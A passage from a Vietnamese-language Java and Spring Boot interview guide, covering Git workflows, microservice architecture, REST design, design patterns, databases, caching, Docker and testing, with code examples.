- **hotfix/*:** fix bug khẩn cấp từ main, merge về cả main và develop.

---

### Q56: Giải quyết Merge Conflict?

```bash
# Khi conflict xảy ra:
git merge feature/login
# CONFLICT (content): Merge conflict in src/UserService.java

# File sẽ chứa markers:
<<<<<<< HEAD (current branch)
    return userRepo.findByEmail(email);
=======
    return userRepo.findByUsername(username);
>>>>>>> feature/login (incoming branch)

# Bước giải quyết:
# 1. Mở file, chọn giữ code nào (hoặc kết hợp cả hai)
# 2. Xóa conflict markers
# 3. git add <resolved-file>
# 4. git commit (hoặc git merge --continue)

# Nếu muốn hủy merge:
git merge --abort
```

---

### Q57: Cherry-pick, Squash, và Reset?

```bash
# Cherry-pick: lấy 1 commit từ branch khác
git cherry-pick <commit-hash>

# Squash: gộp nhiều commits thành 1 (interactive rebase)
git rebase -i HEAD~3
# Trong editor: đổi "pick" thành "squash" cho commits muốn gộp

# Reset types:
git reset --soft HEAD~1    # giữ changes trong staging area
git reset --mixed HEAD~1   # giữ changes trong working directory (default)
git reset --hard HEAD~1    # XÓA hết changes (nguy hiểm!)
```

---

# PHẦN 5: ARCHITECTURE

---

## 5.1. Monolith vs Microservices

### Q58: So sánh Monolith và Microservices?

| Tiêu chí | Monolith | Microservices |
|-----------|----------|---------------|
| Cấu trúc | Một ứng dụng duy nhất | Nhiều service nhỏ độc lập |
| Deploy | Deploy toàn bộ | Deploy từng service |
| Scale | Scale toàn bộ app | Scale từng service |
| Technology | Một tech stack | Mỗi service có thể dùng tech khác |
| Database | Thường dùng chung | Mỗi service DB riêng |
| Complexity | Đơn giản ban đầu | Phức tạp (networking, monitoring) |
| Team | Một team lớn | Nhiều team nhỏ |
| Phù hợp | MVP, startup, small app | Large-scale, nhiều team |

---

### Q59: Kiến trúc Microservices gồm những thành phần gì?

```
                    ┌──────────────┐
                    │  API Gateway │ (routing, auth, rate limiting)
                    └──────┬───────┘
                           │
         ┌─────────────────┼─────────────────┐
         │                 │                 │
   ┌─────┴─────┐    ┌─────┴─────┐    ┌─────┴─────┐
   │ User      │    │ Order     │    │ Payment   │
   │ Service   │    │ Service   │    │ Service   │
   │           │    │           │    │           │
   │  [MySQL]  │    │ [MongoDB] │    │ [Postgres]│
   └─────┬─────┘    └─────┬─────┘    └─────┬─────┘
         │                 │                 │
         └─────────────────┼─────────────────┘
                           │
              ┌────────────┴────────────┐
              │   Message Broker        │
              │  (Kafka / RabbitMQ)     │
              └─────────────────────────┘

Các thành phần:
• Service Discovery (Eureka/Consul): đăng ký & tìm service
• API Gateway (Spring Cloud Gateway/Kong): điểm vào duy nhất
• Config Server: quản lý config tập trung
• Circuit Breaker (Resilience4j): ngăn cascade failure
• Message Broker (Kafka/RabbitMQ): giao tiếp async
• Distributed Tracing (Zipkin/Jaeger): theo dõi request xuyên service
• Centralized Logging (ELK Stack): gom log tập trung
```

---

### Q60: Communication giữa Microservices?

**Synchronous (đồng bộ):**
- **REST API:** HTTP-based, đơn giản, phổ biến.
- **gRPC:** Binary protocol, nhanh hơn REST, dùng Protobuf.
- **Nhược điểm:** tight coupling, latency, cascade failure.

**Asynchronous (bất đồng bộ):**
- **Message Queue (RabbitMQ):** point-to-point hoặc pub/sub.
- **Event Streaming (Kafka):** event-driven, durable, replay.
- **Ưu điểm:** loose coupling, resilient, scalable.

```java
// REST: gọi service khác bằng RestTemplate hoặc WebClient
@Service
public class OrderService {
    private final WebClient webClient;
    
    public UserDTO getUser(Long userId) {
        return webClient.get()
            .uri("http://user-service/api/users/{id}", userId)
            .retrieve()
            .bodyToMono(UserDTO.class)
            .block();
    }
}

// Kafka: giao tiếp bất đồng bộ
@Service
public class OrderService {
    @Autowired private KafkaTemplate<String, OrderEvent> kafkaTemplate;
    
    public void placeOrder(Order order) {
        orderRepo.save(order);
        kafkaTemplate.send("order-topic", new OrderEvent(order.getId(), "CREATED"));
    }
}

@KafkaListener(topics = "order-topic")
public void handleOrderEvent(OrderEvent event) {
    // Payment service xử lý
}
```

---

### Q61: Circuit Breaker Pattern?

Ngăn chặn cascade failure khi một service bị down.

```
States:
CLOSED ──(failure count > threshold)──→ OPEN
   ↑                                       │
   │                              (timeout expires)
   │                                       │
   └──(success count > threshold)── HALF_OPEN
```

- **CLOSED:** Bình thường, request đi qua. Đếm failures.
- **OPEN:** Chặn tất cả request, trả fallback ngay. Sau timeout → HALF_OPEN.
- **HALF_OPEN:** Cho phép vài request thử, nếu OK → CLOSED, nếu fail → OPEN.

```java
@Service
public class PaymentService {
    
    @CircuitBreaker(name = "paymentService", fallbackMethod = "paymentFallback")
    @Retry(name = "paymentService")
    @RateLimiter(name = "paymentService")
    public PaymentResponse processPayment(PaymentRequest request) {
        return paymentClient.charge(request);
    }
    
    public PaymentResponse paymentFallback(PaymentRequest request, Exception ex) {
        return new PaymentResponse("PENDING", "Payment queued for retry");
    }
}

# application.yml
resilience4j:
  circuitbreaker:
    instances:
      paymentService:
        sliding-window-size: 10
        failure-rate-threshold: 50
        wait-duration-in-open-state: 30s
        permitted-number-of-calls-in-half-open-state: 3
```

---

## 5.2. Layered Architecture

### Q62: Kiến trúc phân tầng (Layered/N-Tier)?

```
┌─────────────────────────────────────┐
│  Presentation Layer (Controller)    │  ← Nhận request, trả response
│  - REST Controllers                │
│  - DTOs, Validation                │
├─────────────────────────────────────┤
│  Service Layer (Business Logic)     │  ← Xử lý nghiệp vụ
│  - Services                        │
│  - Transaction management          │
├─────────────────────────────────────┤
│  Repository Layer (Data Access)     │  ← Truy xuất database
│  - Repositories                    │
│  - Entities                        │
├─────────────────────────────────────┤
│  Database Layer                     │  ← Lưu trữ dữ liệu
│  - MySQL, PostgreSQL, MongoDB      │
└─────────────────────────────────────┘

Nguyên tắc: Layer trên chỉ gọi layer dưới trực tiếp, không skip layer.
Controller → Service → Repository → Database
```

---

### Q63: DTO pattern? Tại sao cần?

**DTO (Data Transfer Object):** Object chuyên dùng để truyền data giữa các layer, tách biệt entity/domain model khỏi API.

**Tại sao cần:**
- Ẩn thông tin nhạy cảm (password, internal IDs).
- Giảm data truyền (chỉ gửi fields cần thiết).
- Tách biệt API contract khỏi database schema.
- Flexibility: thay đổi DB schema không ảnh hưởng API.

```java
// Entity (database model)
@Entity
public class User {
    @Id @GeneratedValue private Long id;
    private String name;
    private String email;
    private String passwordHash;   // KHÔNG trả về client!
    private LocalDateTime createdAt;
    private boolean deleted;       // soft delete
}

// Response DTO
public record UserResponse(Long id, String name, String email, LocalDateTime createdAt) {}

// Request DTO
public record CreateUserRequest(
    @NotBlank String name,
    @Email String email,
    @Size(min = 8) String password
) {}

// Mapper (dùng MapStruct hoặc thủ công)
@Mapper(componentModel = "spring")
public interface UserMapper {
    UserResponse toResponse(User user);
    User toEntity(CreateUserRequest request);
}
```

---

## 5.3. RESTful API Design

### Q64: REST principles và best practices?

**6 REST Constraints:**
1. **Client-Server:** Tách biệt client và server.
2. **Stateless:** Server không lưu state client.
3. **Cacheable:** Response có thể cache.
4. **Uniform Interface:** Giao diện thống nhất.
5. **Layered System:** Kiến trúc phân tầng.
6. **Code on Demand (optional):** Server có thể gửi executable code.

**Best Practices cho URL:**
```
GET    /api/v1/users              ← list users
GET    /api/v1/users/123          ← get user 123
POST   /api/v1/users              ← create user
PUT    /api/v1/users/123          ← update user 123 (full)
PATCH  /api/v1/users/123          ← update user 123 (partial)
DELETE /api/v1/users/123          ← delete user 123

GET    /api/v1/users/123/orders   ← orders of user 123
GET    /api/v1/users?status=active&page=1&size=10  ← filtering & pagination

Quy tắc:
• Dùng danh từ số nhiều: /users (không phải /user hay /getUsers)
• Dùng kebab-case: /order-items (không phải /orderItems)
• Versioning: /api/v1/...
• Nested resources tối đa 2 cấp
```

**HTTP Status Codes:**
```
2xx: Success
  200 OK                 ← GET, PUT, PATCH thành công
  201 Created            ← POST thành công
  204 No Content         ← DELETE thành công

4xx: Client Error
  400 Bad Request        ← dữ liệu không hợp lệ
  401 Unauthorized       ← chưa xác thực
  403 Forbidden          ← không có quyền
  404 Not Found          ← resource không tồn tại
  409 Conflict           ← conflict (duplicate email...)
  422 Unprocessable      ← entity hợp lệ syntax nhưng sai logic

5xx: Server Error
  500 Internal Error     ← lỗi server
  502 Bad Gateway        ← upstream service lỗi
  503 Service Unavailable ← server quá tải
```

---

### Q65: Pagination, Sorting, Filtering?

```java
@GetMapping
public ResponseEntity<PageResponse<UserResponse>> getUsers(
    @RequestParam(defaultValue = "0") int page,
    @RequestParam(defaultValue = "10") int size,
    @RequestParam(defaultValue = "name") String sortBy,
    @RequestParam(defaultValue = "asc") String sortDir,
    @RequestParam(required = false) String status,
    @RequestParam(required = false) String search
) {
    Sort sort = sortDir.equalsIgnoreCase("desc") 
        ? Sort.by(sortBy).descending() 
        : Sort.by(sortBy).ascending();
    
    Pageable pageable = PageRequest.of(page, size, sort);
    Page<User> users = userService.findUsers(status, search, pageable);
    
    return ResponseEntity.ok(new PageResponse<>(
        users.getContent().stream().map(mapper::toResponse).toList(),
        users.getNumber(),
        users.getSize(),
        users.getTotalElements(),
        users.getTotalPages()
    ));
}

// Response format:
// {
//   "content": [...],
//   "page": 0,
//   "size": 10,
//   "totalElements": 100,
//   "totalPages": 10
// }
```

---

# PHẦN 6: DESIGN PATTERNS

---

## 6.1. Creational Patterns

### Q66: Singleton Pattern?

Đảm bảo class chỉ có duy nhất một instance.

```java
// Cách 1: Eager initialization
public class DatabaseConnection {
    private static final DatabaseConnection INSTANCE = new DatabaseConnection();
    private DatabaseConnection() {}
    public static DatabaseConnection getInstance() { return INSTANCE; }
}

// Cách 2: Lazy + Thread-safe (Double-Checked Locking)
public class DatabaseConnection {
    private static volatile DatabaseConnection instance;
    private DatabaseConnection() {}
    
    public static DatabaseConnection getInstance() {
        if (instance == null) {
            synchronized (DatabaseConnection.class) {
                if (instance == null) {
                    instance = new DatabaseConnection();
                }
            }
        }
        return instance;
    }
}

// Cách 3: Enum (Joshua Bloch recommend)
public enum DatabaseConnection {
    INSTANCE;
    public void connect() { }
}

// Trong Spring: @Service, @Component mặc định là Singleton
```

---

### Q67: Factory Pattern?

Tạo object mà không expose logic creation, dùng interface chung.

```java
// Simple Factory
public class NotificationFactory {
    public static Notification create(String type) {
        return switch (type) {
            case "EMAIL" -> new EmailNotification();
            case "SMS" -> new SmsNotification();
            case "PUSH" -> new PushNotification();
            default -> throw new IllegalArgumentException("Unknown type: " + type);
        };
    }
}

// Abstract Factory: factory of factories
public interface UIFactory {
    Button createButton();
    TextField createTextField();
}

public class WindowsUIFactory implements UIFactory {
    public Button createButton() { return new WindowsButton(); }
    public TextField createTextField() { return new WindowsTextField(); }
}

public class MacUIFactory implements UIFactory {
    public Button createButton() { return new MacButton(); }
    public TextField createTextField() { return new MacTextField(); }
}
```

---

### Q68: Builder Pattern?

Xây dựng object phức tạp theo từng bước.

```java
// Thủ công
public class HttpRequest {
    private final String url;
    private final String method;
    private final Map<String, String> headers;
    private final String body;
    private final int timeout;

    private HttpRequest(Builder builder) {
        this.url = builder.url;
        this.method = builder.method;
        this.headers = builder.headers;
        this.body = builder.body;
        this.timeout = builder.timeout;
    }

    public static class Builder {
        private final String url;          // required
        private String method = "GET";     // default
        private Map<String, String> headers = new HashMap<>();
        private String body;
        private int timeout = 30000;

        public Builder(String url) { this.url = url; }
        public Builder method(String method) { this.method = method; return this; }
        public Builder header(String key, String value) { headers.put(key, value); return this; }
        public Builder body(String body) { this.body = body; return this; }
        public Builder timeout(int ms) { this.timeout = ms; return this; }
        public HttpRequest build() { return new HttpRequest(this); }
    }
}

// Usage
HttpRequest request = new HttpRequest.Builder("https://api.example.com/users")
    .method("POST")
    .header("Content-Type", "application/json")
    .body("{\"name\": \"John\"}")
    .timeout(5000)
    .build();

// Lombok @Builder (production shortcut)
@Builder
@Getter
public class HttpRequest {
    private String url;
    @Builder.Default private String method = "GET";
    @Singular private Map<String, String> headers;
    private String body;
    @Builder.Default private int timeout = 30000;
}
```

---

## 6.2. Structural Patterns

### Q69: Adapter Pattern?

Cho phép 2 interface không tương thích làm việc cùng nhau.

```java
// Legacy service (không thể sửa)
public class OldPaymentGateway {
    public void makePayment(String cardNumber, double amount) { ... }
}

// Interface mới mong muốn
public interface PaymentProcessor {
    PaymentResult process(PaymentRequest request);
}

// Adapter
public class PaymentAdapter implements PaymentProcessor {
    private final OldPaymentGateway gateway;
    
    public PaymentAdapter(OldPaymentGateway gateway) {
        this.gateway = gateway;
    }
    
    @Override
    public PaymentResult process(PaymentRequest request) {
        gateway.makePayment(request.getCardNumber(), request.getAmount());
        return new PaymentResult(true, "Payment successful");
    }
}
```

---

### Q70: Proxy Pattern?

Cung cấp một đại diện (surrogate) kiểm soát truy cập đến object thực.

```java
// Ứng dụng: caching proxy
public interface ProductService {
    Product getById(Long id);
}

public class ProductServiceImpl implements ProductService {
    public Product getById(Long id) {
        // gọi database (chậm)
        return productRepo.findById(id).orElseThrow();
    }
}

public class CachingProductProxy implements ProductService {
    private final ProductService realService;
    private final Map<Long, Product> cache = new ConcurrentHashMap<>();
    
    public Product getById(Long id) {
        return cache.computeIfAbsent(id, realService::getById);
    }
}

// Spring dùng Proxy Pattern cho:
// - @Transactional (Transaction Proxy)
// - @Cacheable (Caching Proxy)
// - AOP (Aspect Proxy)
```

---

### Q71: Decorator Pattern?

Thêm tính năng cho object mà không sửa code gốc.

```java
public interface DataSource {
    void writeData(String data);
    String readData();
}

public class FileDataSource implements DataSource {
    public void writeData(String data) { /* write to file */ }
    public String readData() { /* read from file */ }
}

// Decorator base
public abstract class DataSourceDecorator implements DataSource {
    protected final DataSource wrappee;
    public DataSourceDecorator(DataSource source) { this.wrappee = source; }
}

public class EncryptionDecorator extends DataSourceDecorator {
    public EncryptionDecorator(DataSource source) { super(source); }
    
    public void writeData(String data) {
        wrappee.writeData(encrypt(data));  // encrypt trước khi ghi
    }
    public String readData() {
        return decrypt(wrappee.readData()); // decrypt sau khi đọc
    }
}

public class CompressionDecorator extends DataSourceDecorator {
    public void writeData(String data) {
        wrappee.writeData(compress(data));  // nén trước khi ghi
    }
}

// Kết hợp nhiều decorator
DataSource source = new CompressionDecorator(
    new EncryptionDecorator(
        new FileDataSource("data.txt")
    )
);
source.writeData("Hello"); // compress → encrypt → write file
```

---

## 6.3. Behavioral Patterns

### Q72: Strategy Pattern?

Định nghĩa nhiều thuật toán, cho phép chuyển đổi runtime.

```java
// Interface
public interface PricingStrategy {
    double calculatePrice(Order order);
}

// Implementations
@Component("regular")
public class RegularPricing implements PricingStrategy {
    public double calculatePrice(Order order) { return order.getTotal(); }
}

@Component("premium")
public class PremiumPricing implements PricingStrategy {
    public double calculatePrice(Order order) { return order.getTotal() * 0.9; } // 10% off
}

@Component("vip")
public class VIPPricing implements PricingStrategy {
    public double calculatePrice(Order order) { return order.getTotal() * 0.8; } // 20% off
}

// Context
@Service
public class OrderService {
    private final Map<String, PricingStrategy> strategies;
    
    @Autowired
    public OrderService(Map<String, PricingStrategy> strategies) {
        this.strategies = strategies;  // Spring inject tất cả implementations
    }
    
    public double calculatePrice(Order order, String customerType) {
        PricingStrategy strategy = strategies.get(customerType);
        return strategy.calculatePrice(order);
    }
}
```

---

### Q73: Observer Pattern?

Khi một object thay đổi trạng thái, tất cả dependents được notify tự động.

```java
// Spring Event: implementation hiện đại của Observer

// Event
public class OrderCreatedEvent {
    private final Order order;
    public OrderCreatedEvent(Order order) { this.order = order; }
    public Order getOrder() { return order; }
}

// Publisher
@Service
public class OrderService {
    @Autowired private ApplicationEventPublisher publisher;
    
    public Order createOrder(OrderRequest request) {
        Order order = orderRepo.save(new Order(request));
        publisher.publishEvent(new OrderCreatedEvent(order)); // publish
        return order;
    }
}

// Listeners (Observers)
@Component
public class EmailNotificationListener {
    @EventListener
    public void onOrderCreated(OrderCreatedEvent event) {
        emailService.sendConfirmation(event.getOrder());
    }
}

@Component
public class InventoryListener {
    @EventListener
    @Async  // xử lý bất đồng bộ
    public void onOrderCreated(OrderCreatedEvent event) {
        inventoryService.reserve(event.getOrder().getItems());
    }
}
```

---

### Q74: Template Method Pattern?

Định nghĩa skeleton thuật toán trong class cha, class con override từng bước cụ thể.

```java
public abstract class DataProcessor {
    
    // Template method (final, không cho override)
    public final void process() {
        readData();
        validate();
        transform();
        save();
        notify();
    }
    
    abstract void readData();
    abstract void transform();
    
    void validate() { /* default validation */ }
    void save() { /* default save to DB */ }
    void notify() { /* optional hook, do nothing by default */ }
}

public class CsvDataProcessor extends DataProcessor {
    @Override void readData() { /* parse CSV */ }
    @Override void transform() { /* transform CSV data */ }
    @Override void notify() { /* send email notification */ }
}

public class JsonDataProcessor extends DataProcessor {
    @Override void readData() { /* parse JSON */ }
    @Override void transform() { /* transform JSON data */ }
}
```

---

## 6.4. Other Important Patterns

### Q75: Repository Pattern?

Tách biệt data access logic khỏi business logic.

```java
// Spring Data JPA đã implement sẵn Repository Pattern
public interface UserRepository extends JpaRepository<User, Long> {
    // Spring tự generate implementation
}

// Custom Repository khi cần logic phức tạp
public interface UserRepositoryCustom {
    List<User> searchWithCriteria(UserSearchCriteria criteria);
}

public class UserRepositoryImpl implements UserRepositoryCustom {
    @PersistenceContext private EntityManager em;
    
    @Override
    public List<User> searchWithCriteria(UserSearchCriteria criteria) {
        CriteriaBuilder cb = em.getCriteriaBuilder();
        CriteriaQuery<User> query = cb.createQuery(User.class);
        Root<User> root = query.from(User.class);
        
        List<Predicate> predicates = new ArrayList<>();
        if (criteria.getName() != null) {
            predicates.add(cb.like(root.get("name"), "%" + criteria.getName() + "%"));
        }
        if (criteria.getMinAge() != null) {
            predicates.add(cb.greaterThanOrEqualTo(root.get("age"), criteria.getMinAge()));
        }
        
        query.where(predicates.toArray(new Predicate[0]));
        return em.createQuery(query).getResultList();
    }
}
```

---

### Q76: MVC Pattern?

```
         Request
            │
            ▼
    ┌──────────────┐
    │  Controller  │  ← Nhận input, điều phối
    └──────┬───────┘
           │ gọi
           ▼
    ┌──────────────┐
    │    Model     │  ← Business logic, data
    └──────┬───────┘
           │ trả data
           ▼
    ┌──────────────┐
    │    View      │  ← Hiển thị (JSON/HTML/...)
    └──────────────┘
           │
           ▼
        Response
```

Trong Spring MVC:
- **Model:** Entity + Service + Repository
- **View:** JSON (REST) hoặc Thymeleaf/JSP (server-side rendering)
- **Controller:** @Controller / @RestController

---

# PHẦN 7: CÂU HỎI TỔNG HỢP NÂNG CAO

---

### Q77: CAP Theorem là gì?

Trong hệ phân tán, chỉ có thể đạt 2 trong 3:

- **Consistency:** Mọi node trả về data giống nhau cùng lúc.
- **Availability:** Mọi request đều nhận được response.
- **Partition Tolerance:** Hệ thống vẫn hoạt động khi network bị phân tách.

```
        C
       / \
      /   \
    CP     CA
    /       \
   P ─── AP ─ A

CP: MongoDB, HBase (chọn consistency khi network partition)
AP: Cassandra, DynamoDB (chọn availability khi network partition)
CA: Truyền thống RDBMS (không chịu partition — chỉ tồn tại trong lý thuyết cho distributed)
```

---

### Q78: ACID vs BASE?

**ACID** (Relational DB):
- **Atomicity:** Transaction là all-or-nothing.
- **Consistency:** Data luôn ở trạng thái hợp lệ.
- **Isolation:** Transaction song song không ảnh hưởng nhau.
- **Durability:** Data đã commit không bị mất.

**BASE** (NoSQL/Distributed):
- **Basically Available:** Hệ thống luôn available.
- **Soft state:** State có thể thay đổi theo thời gian.
- **Eventually consistent:** Cuối cùng sẽ consistent (không immediate).

---

### Q79: Caching strategies?

```
1. Cache-Aside (Lazy Loading):
   Read: App kiểm tra cache → miss → đọc DB → lưu cache → trả về
   Write: App ghi DB → invalidate cache

2. Write-Through:
   Write: App ghi cache → cache ghi DB (đồng bộ)
   → data luôn consistent, nhưng write chậm

3. Write-Behind (Write-Back):
   Write: App ghi cache → cache async ghi DB
   → write nhanh, nhưng có risk mất data

4. Read-Through:
   Read: App gọi cache → cache tự đọc DB nếu miss
```

```java
// Spring @Cacheable
@Service
public class ProductService {
    
    @Cacheable(value = "products", key = "#id")
    public Product getById(Long id) {
        return productRepo.findById(id).orElseThrow();
    }
    
    @CachePut(value = "products", key = "#product.id")
    public Product update(Product product) {
        return productRepo.save(product);
    }
    
    @CacheEvict(value = "products", key = "#id")
    public void delete(Long id) {
        productRepo.deleteById(id);
    }
    
    @CacheEvict(value = "products", allEntries = true)
    public void clearCache() { }
}
```

---

### Q80: Database Indexing?

Index là cấu trúc dữ liệu giúp tìm kiếm nhanh hơn (B-Tree, Hash).

```sql
-- Single column index
CREATE INDEX idx_email ON users(email);

-- Composite index (thứ tự quan trọng!)
CREATE INDEX idx_dept_status ON employees(department_id, status);
-- Query dùng department_id → dùng index ✓
-- Query dùng status → KHÔNG dùng index ✗ (leftmost prefix rule)
-- Query dùng cả hai → dùng index ✓

-- Unique index
CREATE UNIQUE INDEX idx_unique_email ON users(email);

-- Covering index (include all needed columns)
CREATE INDEX idx_name_email ON users(name) INCLUDE (email);
```

**Khi nào dùng index:**
- Cột thường xuyên trong WHERE, JOIN, ORDER BY.
- Cột có nhiều giá trị distinct (high cardinality).

**Khi nào KHÔNG nên:**
- Bảng nhỏ.
- Cột ít distinct values (ví dụ: boolean).
- Bảng write nhiều hơn read (index làm chậm write).

---

### Q81: SQL vs NoSQL?

| | SQL (Relational) | NoSQL |
|--|---|---|
| Schema | Fixed (bảng, cột cố định) | Flexible/Schema-less |
| Scaling | Vertical (scale up) | Horizontal (scale out) |
| ACID | Đầy đủ | Thường eventual consistency |
| Joins | Hỗ trợ tốt | Hạn chế hoặc không |
| Ví dụ | MySQL, PostgreSQL, Oracle | MongoDB, Redis, Cassandra |
| Phù hợp | Structured data, complex queries | Big data, real-time, flexible schema |

**Các loại NoSQL:**
- **Document:** MongoDB (JSON documents)
- **Key-Value:** Redis, DynamoDB
- **Column-Family:** Cassandra, HBase
- **Graph:** Neo4j (quan hệ phức tạp)

---

### Q82: Connection Pool hoạt động thế nào? HikariCP?

```
Application
    │
    ├── Thread 1 ─── borrow ──→ ┌────────────────┐
    │                            │  Connection 1  │ (active)
    ├── Thread 2 ─── borrow ──→ │  Connection 2  │ (active)
    │                            │  Connection 3  │ (idle)
    ├── Thread 3 ─── waiting ──→ │  Connection 4  │ (idle)
    │                            │  Connection 5  │ (idle)
    └── Thread 1 ─── return ──→ └────────────────┘
                                   Connection Pool

Cơ chế:
1. Pool tạo sẵn N connections khi khởi động
2. Thread cần → borrow connection từ pool
3. Dùng xong → return connection về pool (không đóng)
4. Nếu pool hết → Thread chờ hoặc timeout
```

```yaml
# HikariCP config tối ưu
spring:
  datasource:
    hikari:
      maximum-pool-size: 10       # connections tối đa
      minimum-idle: 5             # connections idle tối thiểu
      connection-timeout: 30000   # chờ borrow tối đa (ms)
      idle-timeout: 600000        # idle connection bị đóng sau (ms)
      max-lifetime: 1800000       # connection sống tối đa (ms)
      leak-detection-threshold: 60000  # phát hiện connection leak
```

---

### Q83: Phân biệt PUT vs PATCH vs POST?

| | POST | PUT | PATCH |
|--|------|-----|-------|
| Mục đích | Tạo mới | Cập nhật toàn bộ | Cập nhật một phần |
| Idempotent | Không | Có | Có thể |
| Body | Dữ liệu tạo mới | Toàn bộ resource | Chỉ fields thay đổi |

```java
// POST: tạo mới user
// Request: POST /api/users
// Body: { "name": "John", "email": "john@mail.com", "age": 30 }

// PUT: cập nhật toàn bộ (phải gửi tất cả fields)
// Request: PUT /api/users/1
// Body: { "name": "John Updated", "email": "john@mail.com", "age": 31 }

// PATCH: cập nhật một phần (chỉ gửi fields cần sửa)
// Request: PATCH /api/users/1
// Body: { "age": 31 }
```

---

### Q84: API Versioning strategies?

```java
// 1. URI Versioning (phổ biến nhất)
@RequestMapping("/api/v1/users")
@RequestMapping("/api/v2/users")

// 2. Header Versioning
@GetMapping(value = "/api/users", headers = "X-API-VERSION=1")
@GetMapping(value = "/api/users", headers = "X-API-VERSION=2")

// 3. Parameter Versioning
@GetMapping(value = "/api/users", params = "version=1")
@GetMapping(value = "/api/users", params = "version=2")

// 4. Media Type (Content Negotiation)
@GetMapping(value = "/api/users", produces = "application/vnd.company.v1+json")
@GetMapping(value = "/api/users", produces = "application/vnd.company.v2+json")
```

---

### Q85: Logging best practices trong Spring Boot?

```java
// Dùng SLF4J + Logback (mặc định trong Spring Boot)
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

@Service
public class OrderService {
    private static final Logger log = LoggerFactory.getLogger(OrderService.class);
    // Hoặc dùng Lombok: @Slf4j

    public Order createOrder(OrderRequest request) {
        log.info("Creating order for user: {}", request.getUserId());
        log.debug("Order details: {}", request);
        
        try {
            Order order = processOrder(request);
            log.info("Order created successfully: id={}", order.getId());
            return order;
        } catch (Exception e) {
            log.error("Failed to create order for user: {}", request.getUserId(), e);
            throw e;
        }
    }
}
```

```yaml
# application.yml
logging:
  level:
    root: INFO
    com.myapp: DEBUG
    org.springframework.web: INFO
    org.hibernate.SQL: DEBUG
  pattern:
    console: "%d{yyyy-MM-dd HH:mm:ss} [%thread] %-5level %logger{36} - %msg%n"
  file:
    name: logs/application.log
```

---

### Q86: Docker basics cho Java developer?

```dockerfile
# Multi-stage build cho Spring Boot
FROM maven:3.9-eclipse-temurin-17 AS build
WORKDIR /app
COPY pom.xml .
RUN mvn dependency:go-offline
COPY src ./src
RUN mvn package -DskipTests

FROM eclipse-temurin:17-jre-alpine
WORKDIR /app
COPY --from=build /app/target/*.jar app.jar
EXPOSE 8080
ENTRYPOINT ["java", "-jar", "app.jar"]
```

```yaml
# docker-compose.yml
version: '3.8'
services:
  app:
    build: .
    ports: ["8080:8080"]
    environment:
      SPRING_DATASOURCE_URL: jdbc:mysql://db:3306/mydb
    depends_on: [db]
  
  db:
    image: mysql:8
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: mydb
    ports: ["3306:3306"]
    volumes: ["mysql_data:/var/lib/mysql"]

volumes:
  mysql_data:
```

---

### Q87: Testing trong Spring Boot?

```java
// Unit Test (không cần Spring context)
@ExtendWith(MockitoExtension.class)
class UserServiceTest {
    @Mock private UserRepository userRepository;
    @InjectMocks private UserService userService;
    
    @Test
    void shouldCreateUser() {
        // Given
        CreateUserRequest request = new CreateUserRequest("John", "john@mail.com");
        User savedUser = new User(1L, "John", "john@mail.com");
        when(userRepository.save(any(User.class))).thenReturn(savedUser);
        
        // When
        UserResponse response = userService.createUser(request);
        
        // Then
        assertThat(response.getName()).isEqualTo("John");
        verify(userRepository, times(1)).save(any(User.class));
    }
}

// Integration Test (full Spring context)
@SpringBootTest
@AutoConfigureMockMvc
class UserControllerIT {
    @Autowired private MockMvc mockMvc;
    @Autowired private ObjectMapper objectMapper;
    
    @Test
    void shouldCreateUserAndReturn201() throws Exception {
        CreateUserRequest request = new CreateUserRequest("John", "john@mail.com");
        
        mockMvc.perform(post("/api/users")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(request)))
            .andExpect(status().isCreated())
            .andExpect(jsonPath("$.name").value("John"))
            .andExpect(jsonPath("$.email").value("john@mail.com"));
    }
}

// Repository Test
@DataJpaTest
class UserRepositoryTest {
    @Autowired private UserRepository userRepository;
    @Autowired private TestEntityManager entityManager;
    
    @Test
    void shouldFindByEmail() {
        entityManager.persist(new User("John", "john@mail.com"));
        Optional<User> found = userRepository.findByEmail("john@mail.com");
        assertThat(found).isPresent();
    }
}
```

---

### Q197: JUnit 5 annotations đầy đủ (các annotation hay dùng)

**Trả lời:**

| Annotation | Mục đích ngắn |
|---|---|
| `@Test` | Đánh dấu test case |
| `@BeforeEach` / `@AfterEach` | Chạy trước/sau mỗi test |
| `@BeforeAll` / `@AfterAll` | Chạy một lần cho cả class |
| `@DisplayName` | Tên hiển thị dễ đọc |
| `@Disabled` | Tạm skip test |
| `@ParameterizedTest` | Chạy test với nhiều input |
| `@ValueSource` / `@CsvSource` / `@MethodSource` | Cung cấp dữ liệu cho parameterized test |

```java
import org.junit.jupiter.api.*;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.params.provider.MethodSource;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.stream.Stream;

class CalculatorTest {
    static class Calculator {
        int add(int a, int b) { return a + b; }
        int multiply(int a, int b) { return a * b; }
    }

    private static Calculator calculator;

    @BeforeAll
    static void initAll() { calculator = new Calculator(); }

    @BeforeEach
    void init() { /* reset test data */ }

    @Test
    @DisplayName("2 + 3 = 5")
    void shouldAdd() { Assertions.assertEquals(5, calculator.add(2, 3)); }

    @ParameterizedTest
    @ValueSource(ints = {2, 4, 6})
    void shouldBeEven(int n) { Assertions.assertEquals(0, n % 2); }

    @ParameterizedTest
    @CsvSource({"2,3,5", "1,1,2"})
    void shouldAddFromCsv(int a, int b, int expected) {
        Assertions.assertEquals(expected, calculator.add(a, b));
    }

    @ParameterizedTest
    @MethodSource("providePairs")
    void shouldMultiply(int a, int b, int expected) {
        Assertions.assertEquals(expected, calculator.multiply(a, b));
    }

    static Stream<org.junit.jupiter.params.provider.Arguments> providePairs() {
        return Stream.of(
                org.junit.jupiter.params.provider.Arguments.of(2, 3, 6),
                org.junit.jupiter.params.provider.Arguments.of(4, 5, 20)
        );
    }

    @AfterEach
    void cleanup() {}

    @AfterAll
    static void doneAll() {}

    @Disabled("Chờ fix bug BUG-123")
    @Test
    void skippedTemporarily() {}
}
```

---

### Q198: AAA pattern (Arrange-Act-Assert)

**Trả lời:**

AAA giúp test rõ ràng và dễ bảo trì:
1. **Arrange**: chuẩn bị input/dependency.
2. **Act**: gọi method cần test.
3. **Assert**: kiểm tra kết quả.

```java
@ExtendWith(org.mockito.junit.jupiter.MockitoExtension.class)
class UserServiceTest {
    record CreateUserRequest(String name, String email) {}
    record UserResponse(Long id, String name, String email) {}
    static class User {
        Long id; String name; String email;
